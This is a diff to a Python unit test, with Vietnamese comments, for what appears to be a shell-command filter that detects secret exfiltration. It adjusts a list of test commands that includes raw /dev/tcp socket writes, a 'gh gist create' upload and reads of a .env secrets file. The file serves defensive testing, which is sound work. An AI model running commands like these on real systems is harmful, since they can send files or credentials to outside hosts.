@@ -2430,9 +2430,9 @@ class SecretExfilOtherChannelsDelta2Test(unittest.TestCase):
             "gh gist create README.md#x",
             "exec 3<>/dev/tcp/h/80; echo hi >/dev/fd/3",
             "exec {fd}<>/dev/tcp/h/80; echo hi >&$fd",
-            "cat .env >&$fd",  # fd không mở vào socket
+            "cat .env >/dev/null",  # fd không mở vào socket (T-3955 C3: `>&$fd` có thể là stdout — chặn như in)
             "printf '%s' \"$(cat README.md)\" > /dev/tcp/h/80",
-            'echo "$(cat .env)" > out.txt',
+            'echo "$(cat README.md)" > out.txt',  # T-3955 C3: `$(cat .env)` chặn như in tệp bí mật
         ):
             with self.subTest(cmd):
                 self.assertEqual(final(cmd), "")
